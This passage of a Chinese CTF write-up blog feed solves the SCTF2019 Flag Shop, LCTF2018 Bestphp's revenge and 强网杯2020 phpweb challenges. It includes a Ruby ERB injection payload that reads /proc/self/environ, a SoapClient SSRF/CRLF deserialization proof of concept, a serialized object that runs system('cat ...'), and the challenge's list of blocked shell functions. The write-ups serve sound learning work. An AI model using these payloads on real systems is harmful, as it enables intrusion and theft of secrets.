info.uid;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;jkl&quot;</span>).innerText = info.jkl;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>auth 之后会得到一个 jwt token。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194238.png" alt=""></p><p>现在就需要找到secret。扫描站点，发现有filebak</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>重点关注work路由</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看到 /work 那里有 ERB 模板，还直接把可控参数 name 拼进去了，那么这里我们就可以传入一些构造过的参数，来达到我们的目的了。但是限制了payload的长度为7。比如 <code>name=&lt;%=1%&gt;</code>，就会得 1。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194455.png" alt=""></p><p>一些常规的SSTI注入由于长度的限制，最多只能由两个字符，肯定是行不通的。</p><p>对照 <a href="https://blog.csdn.net/zdq0394123/article/details/8443694">Ruby 全局变量表</a> ，不断 fuzz，发现<code>$</code>有东西</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204424.png" alt=""></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>其在模板渲染之前之前有个匹配，就是这里。要是 SECRET 参数存在则对其进行匹配，用传入的这个值去和 <code>ENV[&quot;SECRET&quot;]</code> 匹配，匹配上了就往终端输出 FLAG。然后我们 SECRET 不传试试，这样括号里的匹配就不进行，只进行括号外的 <code>ENV[&quot;SECRET&quot;]</code> 的匹配，再用全局变量 <code>$</code> 就可以读出 <code>ENV[&quot;SECRET&quot;]</code> 了。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204544.png" alt=""></p><h4 id="解法2">解法2</h4><p>HTTP参数传递类型差异产生的攻击面</p><p>先介绍一个trick</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;qwertyu&quot;</span></span><br><span class="line">$b = Array[<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;d&quot;</span>]</span><br><span class="line">puts <span class="string">&quot;$a: <span class="subst">#&#123;$a[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;$b: <span class="subst">#&#123;$b[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure><p>$b变量原本是数组，但是由于被拼接到了字符串中，所以数组做了一个默认的类型转换变成了<code>[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</code></p><p>有了这个trick，上面代码[0,7]从原本的限制7个字符突然变成了限制7个数组长度</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure><blockquote><p>需要对do参数urlencode编码</p></blockquote><h3 id="参考">参考</h3><p><a href="https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html">https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html</a></p><p><a href="https://evoa.me/archives/15/">https://evoa.me/archives/15/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SCTF2019-Flag-Shop&quot;&gt;SCTF2019 Flag Shop&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JWT伪造&lt;/li&gt;
&lt;li&gt;Ruby SSTI&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;解题&quot;&gt;解题&lt;/h3&gt;
&lt;h4
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="Ruby和Go" scheme="http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——PHP反序列化</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-18T11:45:46.000Z</published>
    <updated>2020-09-16T11:54:26.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题——PHP反序列化">BUUCTF刷题——PHP反序列化</h1><h2 id="LCTF2018-Bestphp’s-revenge">LCTF2018 Bestphp’s revenge</h2><blockquote><p>这篇文章分析的很到位：<a href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p></blockquote><h3 id="考点">考点</h3><ul><li>session反序列化</li><li>Soapclient + ssrf</li><li>CRLF</li></ul><h3 id="解题">解题</h3><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line">echo &#39;only localhost can get flag!&#39;; </span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; </span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; </span><br><span class="line">$_SESSION[&#39;flag&#39;] &#x3D; $flag; </span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>思路如下：</p><ol><li>利用第4行回调函数来调用<code>session_start()</code>用于覆盖session序列化引擎为php_serilaze；</li><li>构造SSRF的Soap类的序列化字符串配合上面的序列化注入写入session文件，并且构造的序列化字符串中利用了CRLF漏洞写入了我们规定的seesion_id；</li><li>然后再通过第4行的回调函数调用<code>extract()</code>函数用于变量覆盖，覆盖掉变量b为回调函数<code>call_user_func</code>；</li><li>同时我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求。</li><li>发送请求也就是去访问flag.php，并将结果保存在cookie为第二步我们规定的session_id的文件中。</li><li>再用这个session访问主页，就会<code>var_dump</code>session文件的内容，其中就包含字段名为<code>flag</code>的值。</li></ol><p>先构造POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.$payload;</span><br></pre></td></tr></table></figure><p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p><p>再注入反序列化的字符串：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152347.png" alt=""></p><p>接着触发<code>SoapClient</code>的<code>__call</code>方法发送请求：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152825.png" alt=""></p><p>更改cookie访问：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152931.png" alt=""></p><h3 id="后记">后记</h3><p>这道题卡了我一天的时间，还是一个签到题。。。。有一个问题一直困扰我，就是把POC生成的字符串写到session文件后，他是什么时候把session的文件内容给反序列化出来了。后来看了一篇文章才知道：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623153337.png" alt=""></p><p>于是就反序列化了一个<code>SoapClient</code>的实例，再调用<code>__call</code>函数的时候就会通过这个实例发送请求。</p><h2 id="强网杯2020青龙组-phpweb">强网杯2020青龙组 phpweb</h2><h3 id="考点-v2">考点</h3><ul><li>PHP反序列化</li></ul><h3 id="解题-v2">解题</h3><p>打开题目，查看源码有两个隐藏输入框</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704180308.png" alt=""></p><p>随便输入测试，有一个报错回显，发现这两个输入框是call_user_func函数的参数。</p><p>并且基本上过滤危险函数，用file_get_contents读取<code>index.php</code>源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有一个很明显的<code>__destruct</code>函数，可以执行函数并且没有任何过滤，不过没有触发反序列化的点。</p><p>但是还是可以利用<code>gettime</code>函数中的<code>call_user_func</code>函数传入<code>unserialize</code>函数，生成字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure><p>传入参数<code>unserialize</code>和<code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat 